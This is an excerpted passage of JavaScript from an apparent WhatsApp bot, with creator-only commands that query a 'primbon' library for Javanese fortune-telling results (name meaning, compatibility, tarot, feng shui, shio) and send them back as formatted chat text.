            if (!isCreator) return m.reply(mess.owner)
                if (!text) throw `Example : ${prefix + command} fanz, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                fanz.sendText(from, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
case 'artinama': {
if (!isCreator) return m.reply(mess.owner)
                if (!text) throw `Example : ${prefix + command} fanz Hw`
                let anu = await primbon.arti_nama(text)
                if (anu.status == false) return m.reply(anu.message)
                fanz.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'kecocokannama': case 'cocoknama': {
            if (!isCreator) return m.reply(mess.owner)
                if (!text) throw `Example : ${prefix + command} fanz, 7, 7, 2005`
            ...
            if (!isCreator) return m.reply(mess.owner)
                if (!text) throw `Example : ${prefix + command} fanz|Novia`
                let [nama1, nama2] = text.split`|`
                let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
                if (anu.status == false) return m.reply(anu.message)
                fanz.sendImage(from,  anu.message.gambar, `⭔ *Nama Anda :* ${anu.message.nama_anda}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
            }
            break
            ...
            if (!isCreator) return m.reply(mess.owner)
                ...
                if (anu.status == false) return m.reply(anu.message)
                fanz.sendText(from, `⭔ *Tanggal Pernikahan :* ${anu.message.tanggal}\n⭔ *karakteristik :* ${anu.message.karakteristik}`, m)
            }
            break
            case 'sifatusaha': {
            if (!isCreator) return m.reply(mess.owner)
                ...
                if (anu.status == false) return m.reply(anu.message)
                fanz.sendText(from, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Usaha :* ${anu.message.usaha}`, m)
            }
            break
            ...
            if (!isCreator) return m.reply(mess.owner)
                ...
                if (anu.status == false) return m.reply(anu.message)
                fanz.sendText(from, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Angka Akar :* ${anu.message.angka_akar}\n⭔ *Sifat :* ${anu.message.sifat}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
            }
            break
            ...
            if (!isCreator) return m.reply(mess.owner)
                ...
                if (anu.status == false) return m.reply(anu.message)
                fanz.sendImage(from, anu.message.image, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Simbol Tarot :* ${anu.message.simbol_tarot}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'fengshui': {
            if (!isCreator) return m.reply(mess.owner)
                if (!text) throw `Example : ${prefix + command} fanz, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
            ...
            if (!isCreator) return m.reply(mess.owner)
                ...
                if (anu.status == false) return m.reply(anu.message)
                fanz.sendText(from, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Kala Tinantang :* ${anu.message.kala_tinantang}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            ...
            if (!isCreator) return m.reply(mess.owner)
                ...
                if (anu.status == false) return m.reply(anu.message)
                fanz.sendText(from, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hari Naas :* ${anu.message.hari_naas}\n⭔ *Info :* ${anu.message.catatan}\n⭔ *Catatan :* ${anu.message.info}`, m)
            }
            break
            ...
            case 'peruntungan': {
            if (!isCreator) return m.reply(mess.owner)
                if (!text) throw `Example : ${prefix + command} fanz, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`
            ...
            if (!isCreator) return m.reply(mess.owner)
                ...
                if (anu.status == false) return m.reply(anu.message)
                fanz.sendText(from, `⭔ *Tanggal :* ${anu.message.tanggal}\n⭔ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n⭔ *Watak Hari :* ${anu.message.watak_hari}\n⭔ *Naga Hari :* ${anu.message.naga_hari}\n⭔ *Jam Baik :* ${anu.message.jam_baik}\n⭔ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
            }
            break
            ...
            if (!isCreator) return m.reply(mess.owner)
                ...
                if (anu.status == false) return m.reply(anu.message)
                fanz.sendText(from, `⭔ *Tanggal :* ${anu.message.tgl_memancing}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'masasubur': {
            if (!isCreator) return m.reply(mess.owner)
                ...
                if (anu.status == false) return m.reply(anu.message)
                fanz.sendText(from, `⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            ...
            case 'shio': {
                ...
                if (anu.status == false) return m.reply(anu.message)
                fanz.sendText(from, `⭔ *Hasil :* ${anu.message}`, m)
            }
            break
...
fanz.copyNForward(from, msgs[budy.toLowerCase()], true)}}
} catch (err) {
